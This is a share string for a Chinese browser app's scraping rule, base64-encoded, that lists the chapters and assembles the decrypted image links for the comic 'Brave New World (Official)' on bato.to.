S63uHVed,邀您一起看：Brave New World (Official),xiaomianao666,JavaScript,Monday 6th of May 2024 12:40:28 PM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥Brave New World (Official)@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZGlzcGxheU5hbWVcIjpcIkJhdG8udG9cIixcImZpZWxkc1RvU2V0VG9EZWZhdWx0XCI6W10sXCJnbXRNb2RpZmllZFwiOjAsXCJpZFwiOjAsXCJsYXN0X2NoYXB0ZXJfcnVsZVwiOlwiXCIsXCJsaXN0VG9DbGVhckFzc29jaWF0ZWRGS1wiOltdLFwibGlzdFRvQ2xlYXJTZWxmRktcIjpbXSxcInBhZ2VMaXN0XCI6W10sXCJwYXJhbXNcIjpcInt9XCIsXCJzYXZlZFwiOmZhbHNlLFwidGl0bGVcIjpcIuiBmua8q/CflK5cIixcInZlcnNpb25cIjowLFwidXJsXCI6XCJodHRwczovL2JhdG8udG8vc2VyaWVzLzEyNjk3NS9icmF2ZS1uZXctd29ybGQtb2ZmaWNpYWwjaW1tZXJzaXZlVGhlbWUjI2F1dG9DYWNoZSM7Z2V0O1VURi04O3tVc2VyLUFnZW50QE1vemlsbGEvNS4wIChMaW51eO+8m++8myBBbmRyb2lkIDEx77yb77ybIE1pIDEwIFBybykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzg4LjAuNDMyNC4xNTIgTW9iaWxlIFNhZmFyaS81MzcuMzZ9XCIsXCJjb2xfdHlwZVwiOlwibW92aWVfMVwiLFwiZmluZF9ydWxlXCI6XCJqczpcXG52YXIgZCA9IFtdXFxudmFyIGh0bWwgPSBnZXRSZXNDb2RlKCk7XFxuXFxuZXZhbChKU09OLnBhcnNlKHJlcXVlc3QoJ2hpa2VyOi8vcGFnZS9jb21pY0Z1bmN0aW9uRmlsZS5qcz9ydWxlPeiBmua8q/CflK4nKSkucnVsZSk7XFxuY292ZXIoJyNtYWluZXImJmgzJiZUZXh0JywgJy5wYi0yJiZUZXh0JywgJy5hdHRyLWl0ZW0sNSYmVGV4dCcsICdoNCYmVGV4dCcsICdib2R5JiYubGltaXQtaHRtbCYmVGV4dCcsICdib2R5JiYjbWFpbmVyJiZpbWcmJnNyYycsIE1ZX1VSTCk7XFxuXFxudmFyIGxhenkgPSAkKFxcXCJcXFwiKS5sYXp5UnVsZSgoKSA9PiB7XFxuICAgXFxuICAgIHZhciBwaWNzID0gW107XFxuICAgIFxcbmV2YWwocGRmaChyZXF1ZXN0KGlucHV0KSwnc2NyaXB0Om5vdChbc3JjXSksMSYmSHRtbCcpKVxcbmV2YWwocmVxdWVzdCgnaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvY3J5cHRvLWpzLzQuMC4wL2NyeXB0by1qcy5taW4uanMnKSlcXG52YXIgYWNjID0gSlNPTi5wYXJzZShDcnlwdG9KUy5BRVMuZGVjcnlwdChiYXRvV29yZCwgYmF0b1Bhc3MpLnRvU3RyaW5nKENyeXB0b0pTLmVuYy5VdGY4KSlcXG5mb3IodmFyIGkgaW4gaW1nSHR0cExpcyl7XFxuICBwaWNzLnB1c2goaW1nSHR0cExpc1tpXSsnPycrYWNjW2ldKydAUmVmZXJlcj1odHRwczovL2JhdG8udG8vJylcXG59XFxuICAgIHJldHVybiBcXFwicGljczovL1xcXCIgKyBwaWNzLmpvaW4oXFxcIiYmXFxcIilcXG59KTtcXG5cXG52YXIgbGlzdCA9IHBkZmEoaHRtbCwgJy5tYWluJiYucC0yJykucmV2ZXJzZSgpXFxubGlzdC5mb3JFYWNoKG1oID0+IHtcXG4gICAgZC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOiBwZGZoKG1oLCAnYiYmVGV4dCcpLFxcbiAgICAgICAgdXJsOiBwZChtaCwgJ2EmJmhyZWYnKStsYXp5LFxcbiAgICAgICAgY29sX3R5cGU6ICd0ZXh0XzInLFxcbiAgICB9KVxcbn0pXFxuc2V0UmVzdWx0KGQpXCIsXCJncm91cFwiOlwi6IGa5ryr8J+UrlwiLFwidWFcIjpcIm1vYmlsZVwiLFwicHJlUnVsZVwiOlwiXCIsXCJwYWdlc1wiOlwiW11cIn0iLCJwaWNVcmwiOiJodHRwczovL3hmcy1uMDkueGZzYmIuY29tL3RodW1iL1czMDAvYW1waS9mMTMvZjEzMDNlZmFmNDUzYTdjNWUwZTZmOGQwMjQxYmI5NDc0NTBjMWY1ZF83MjBfOTIzXzE2NTg4Mi5qcGVnQFJlZmVyZXI9aHR0cHM6Ly9iYXRvLnRvLyIsInRpdGxlIjoiQnJhdmUgTmV3IFdvcmxkIChPZmZpY2lhbCkifQ==
